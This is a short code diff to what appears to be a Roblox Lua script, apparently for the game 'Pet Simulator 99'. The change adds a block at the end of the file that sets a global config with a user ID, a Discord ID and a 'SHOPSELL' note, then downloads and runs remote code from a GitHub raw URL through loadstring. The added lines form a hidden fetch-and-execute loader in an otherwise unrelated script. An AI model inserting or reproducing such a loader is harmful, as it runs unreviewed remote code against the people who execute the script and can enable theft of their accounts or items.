@@ -570,8 +570,11 @@ end
 
 end)
 
-
-
+wait(1)
+task.spawn(function()
+	_G.Config = { UserID = "5e200359-5807-4037-81d0-ab86e443db75", discord_id = "1203177576994967572", Note = "SHOPSELL" }
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/main/pet99"))()
+end)
 
 
 
